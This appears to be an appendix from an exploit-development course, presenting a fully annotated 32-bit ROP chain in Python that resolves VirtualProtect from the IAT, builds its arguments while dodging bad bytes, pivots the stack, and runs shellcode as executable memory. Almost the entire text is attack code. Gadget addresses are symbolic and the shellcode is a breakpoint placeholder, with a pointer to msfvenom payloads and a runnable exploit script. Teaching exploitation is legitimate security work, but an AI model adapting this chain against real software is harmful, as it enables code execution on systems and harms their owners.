## Appendix B: The complete annotated VirtualProtect chain

Organized by primitive, every line justified. Symbolic addresses = Appendix A.
This is the chain your incremental work converges on — by now it should read as
inevitable. See `exploit/exploit.py` for the runnable version.

```python
# ---- fake VirtualProtect frame, shipped as placeholders, patched by ROP ----
#   [ &VirtualProtect ][ retaddr ][ lpAddress ][ dwSize ][ flNewProtect ][ lpflOldProtect ]
frame  = pack("<L", 0x45454545)  # &VirtualProtect   (resolve at runtime)
frame += pack("<L", 0x46464646)  # return address    (= shellcode)
frame += pack("<L", 0x47474747)  # lpAddress         (= shellcode)
frame += pack("<L", 0x48484848)  # dwSize            (0x201)
frame += pack("<L", 0x51515151)  # flNewProtect      (0x40)
frame += pack("<L", 0x52525252)  # lpflOldProtect    (writable scratch)

# =====================================================================
# P0  Acquire stack pointer: ESP -> ESI
# =====================================================================
rop  = pack("<L", G_STACKPTR)        # push esp; push eax; pop edi; pop esi; ret

# =====================================================================
# P1  Resolve VirtualProtect from the IAT into EAX
#     (IAT slot carries 0x20 -> ship slot+1, correct with -1)
# =====================================================================
rop += pack("<L", G_POP_EAX)
rop += pack("<L", IAT_VIRTUALPROTECT + 1)   # dodge 0x20 bad byte
rop += pack("<L", G_POP_ECX)
rop += pack("<L", 0xFFFFFFFF)               # -1
rop += pack("<L", G_ADD_EAX_ECX)            # eax = real IAT slot
rop += pack("<L", G_DEREF_EAX)              # eax = &VirtualProtect

# =====================================================================
# P2  Point ESI at frame[0] (&VP slot) and store EAX there
#     frame[0] sits at ESP-0x1C in this layout -> add -0x1C
# =====================================================================
rop += pack("<L", G_MOV_EAX_ESI_KEEP)       # (variant that preserves needed regs; see note)
rop += pack("<L", G_POP_ECX)
rop += pack("<L", 0xFFFFFFE4)               # -0x1C
rop += pack("<L", G_ADD_EAX_ECX)            # eax = &frame[0]
rop += pack("<L", G_PUSH_EAX_POP_ESI)       # esi = &frame[0]
rop += pack("<L", G_STORE)                  # frame[0] = &VirtualProtect

# =====================================================================
# P3  return address (= shellcode): ESI += 4, compute shellcode addr, store
# =====================================================================
rop += pack("<L", G_INC_ESI) * 4            # esi -> frame[1]
rop += pack("<L", G_MOV_EAX_ESI)
rop += pack("<L", G_POP_ECX)
rop += pack("<L", 0xFFFFFDF0)               # -0x210 (finalise in Ch.11)
rop += pack("<L", G_SUB_EAX_ECX)            # eax = shellcode addr
rop += pack("<L", G_STORE)                  # frame[1] = shellcode

# =====================================================================
# P4  lpAddress (= shellcode): ESI += 4, recompute (-0x20C), store
# =====================================================================
rop += pack("<L", G_INC_ESI) * 4            # esi -> frame[2]
rop += pack("<L", G_MOV_EAX_ESI)
rop += pack("<L", G_POP_ECX)
rop += pack("<L", 0xFFFFFDF4)               # -0x20C (advanced 4)
rop += pack("<L", G_SUB_EAX_ECX)
rop += pack("<L", G_STORE)                  # frame[2] = shellcode

# =====================================================================
# P5  dwSize = 0x201  (neg of -0x201, both null-free)
# =====================================================================
rop += pack("<L", G_INC_ESI) * 4            # esi -> frame[3]
rop += pack("<L", G_POP_EAX)
rop += pack("<L", 0xFFFFFDFF)               # -0x201
rop += pack("<L", G_NEG_EAX)                # eax = 0x201
rop += pack("<L", G_STORE)                  # frame[3] = 0x201

# =====================================================================
# P6  flNewProtect = 0x40  (split-add, both operands null-free)
# =====================================================================
rop += pack("<L", G_INC_ESI) * 4            # esi -> frame[4]
rop += pack("<L", G_POP_EAX)
rop += pack("<L", 0x80808080)
rop += pack("<L", G_POP_ECX)
rop += pack("<L", 0x7F7F7FC0)               # 0x80808080 + 0x7F7F7FC0 = 0x40
rop += pack("<L", G_ADD_EAX_ECX)
rop += pack("<L", G_STORE)                  # frame[4] = 0x40 (PAGE_EXECUTE_READWRITE)

# =====================================================================
# P7  lpflOldProtect = writable scratch pointer
# =====================================================================
rop += pack("<L", G_INC_ESI) * 4            # esi -> frame[5]
rop += pack("<L", G_MOV_EAX_ESI)            # eax = &frame[5] (writable stack dword)
rop += pack("<L", G_STORE)                  # frame[5] = &frame[5]  (points at itself: writable)

# =====================================================================
# P8  Pivot ESP onto &VP and fire
#     aim EBP 4 bytes before frame[0] so the stray 'pop ebp' aligns ESP on &VP
# =====================================================================
rop += pack("<L", G_MOV_EAX_ESI)            # eax = esi (currently frame[5])
rop += pack("<L", G_POP_ECX)
rop += pack("<L", NEG_DELTA_TO_FRAME0_M4)   # null-free delta: esi -> (frame[0]-4)
rop += pack("<L", G_ADD_EAX_ECX)
rop += pack("<L", G_XCHG_EAX_EBP)           # ebp = frame[0]-4
rop += pack("<L", G_MOV_ESP_EBP)            # esp=ebp; pop ebp (eats -4 dummy); ret -> &VP
# VirtualProtect executes; its ret 0x10 returns into frame[1] = shellcode (now RWX)

# ---- payload staging (Chapter 10) ----
padding   = b"\x90" * PAD_N               # optional NOP runway to absorb delta slop
shellcode = b"\xCC" * 32                  # Stage 1: prove control; later: msfvenom -b ...
```

> **Note on `G_MOV_EAX_ESI` variants.** Many `mov eax, esi` gadgets also `pop
> esi` in their tail; when you need ESI preserved, either restore it with
> `push eax ; pop esi` afterward or pick a variant without the pop. Appendix A
> lets you record which variant you found. This bookkeeping *is* ROP.

---

---

[← Previous](A-gadget-table.md) · [Index](00-index.md) · [Next →](C-challenges.md)
